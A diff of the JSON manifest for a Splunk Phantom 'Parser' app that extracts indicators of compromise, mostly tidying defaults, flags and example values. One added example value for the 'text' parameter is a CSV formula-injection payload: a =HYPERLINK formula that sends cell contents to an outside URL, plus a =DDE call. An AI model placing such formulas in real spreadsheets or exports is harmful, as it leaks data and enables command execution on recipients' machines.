@@ -8,7 +8,7 @@
     "logo_dark": "logo_phantom_dark.svg",
     "product_name": "Parser",
     "product_version_regex": ".*",
-    "publisher": "Phantom",
+    "publisher": "Splunk",
     "license": "Copyright (c) 2017-2019 Splunk Inc.",
     "app_version": "1.0.18",
     "utctime_updated": "2019-07-31T18:13:33.000000Z",
@@ -42,14 +42,12 @@
                     "contains": [
                         "vault id"
                     ],
-                    "default": "",
                     "order": 0
                 },
                 "file_type": {
                     "description": "Data Type",
                     "data_type": "string",
                     "required": false,
-                    "primary": false,
                     "value_list": [
                         "txt",
                         "email",
@@ -58,20 +56,16 @@
                         "csv",
                         "html"
                     ],
-                    "default": "",
                     "order": 1
                 },
                 "text": {
                     "description": "Raw text from which to extract IOCs",
                     "data_type": "string",
-                    "primary": false,
-                    "default": "",
                     "order": 2
                 },
                 "is_structured": {
                     "description": "Use first row of CSV file as field names",
                     "data_type": "boolean",
-                    "primary": false,
                     "default": false,
                     "order": 3
                 },
@@ -79,21 +73,18 @@
                     "description": "Add container to this label",
                     "data_type": "string",
                     "required": false,
-                    "primary": false,
                     "order": 4
                 },
                 "max_artifacts": {
                     "description": "Max number of artifacts",
                     "data_type": "numeric",
                     "required": false,
-                    "primary": false,
                     "order": 5
                 },
                 "container_id": {
                     "description": "Add created artifacts to this container",
                     "data_type": "numeric",
                     "required": false,
-                    "primary": false,
                     "order": 6
                 },
                 "run_automation": {
@@ -101,15 +92,8 @@
                     "data_type": "boolean",
                     "default": true,
                     "required": false,
-                    "primary": false,
                     "order": 7
                 }
-            },
-            "render": {
-                "width": 12,
-                "title": "Parse File",
-                "type": "table",
-                "height": 5
             },
             "output": [
                 {
@@ -124,8 +108,7 @@
                     "data_path": "action_result.parameter.container_id",
                     "data_type": "numeric",
                     "example_values": [
-                        "1776",
-                        "52069"
+                        1776
                     ]
                 },
                 {
@@ -133,14 +116,16 @@
                     "data_type": "string",
                     "example_values": [
                         "txt",
-                        "docx"
+                        "docx",
+                        "csv"
                     ]
                 },
                 {
                     "data_path": "action_result.parameter.is_structured",
                     "data_type": "boolean",
                     "example_values": [
-                        ""
+                        true,
+                        false
                     ]
                 },
                 {
@@ -154,29 +139,28 @@
                     "data_path": "action_result.parameter.max_artifacts",
                     "data_type": "numeric",
                     "example_values": [
-                        "100"
+                        100
                     ]
                 },
                 {
                     "data_path": "action_result.parameter.run_automation",
                     "data_type": "boolean",
                     "example_values": [
-                        true
+                        true,
+                        false
                     ]
                 },
                 {
                     "data_path": "action_result.parameter.text",
                     "data_type": "string",
                     "example_values": [
-                        ""
+                        "SrNo, Name, Pincode 1, =HYPERLINK(\"http://contextis.co.uk?leak=\"&A1&A2,\"Error: please click for further information\"), =DDE(server; file; item; mode) 2, Hello, Def 3, FER, SER"
                     ]
                 },
                 {
                     "data_path": "action_result.parameter.vault_id",
                     "data_type": "string",
                     "example_values": [
-                        "0c4ad1e28e5e2e03f2f197e4e4b011c617b89d78",
-                        "bc62872304756d30c0899c941767174faebfc406",
                         "3d6ef06ab51be5a86cdfaba246db2c2eb1d07795"
                     ],
                     "contains": [
@@ -191,7 +175,6 @@
                     "data_path": "action_result.summary.artifacts_found",
                     "data_type": "numeric",
                     "example_values": [
-                        7,
                         13
                     ]
                 },
@@ -199,8 +182,7 @@
                     "data_path": "action_result.summary.container_id",
                     "data_type": "numeric",
                     "example_values": [
-                        "52079",
-                        "1776"
+                        1776
                     ],
                     "column_order": 0,
                     "column_name": "Container ID"
@@ -209,15 +191,13 @@
                     "data_path": "action_result.message",
                     "data_type": "string",
                     "example_values": [
-                        "Container id: 52069, Artifacts found: 27",
-                        "Container id: 52069, Artifacts found: 13"
+                        "Container id: 52069, Artifacts found: 27"
                     ]
                 },
                 {
                     "data_path": "summary.total_objects",
                     "data_type": "numeric",
                     "example_values": [
-                        1,
                         2
                     ]
                 },
@@ -225,11 +205,16 @@
                     "data_path": "summary.total_objects_successful",
                     "data_type": "numeric",
                     "example_values": [
-                        1,
-                        0
+                        1
                     ]
                 }
             ],
+            "render": {
+                "width": 12,
+                "title": "Parse File",
+                "type": "table",
+                "height": 5
+            },
             "versions": "EQ(*)"
         }
     ]
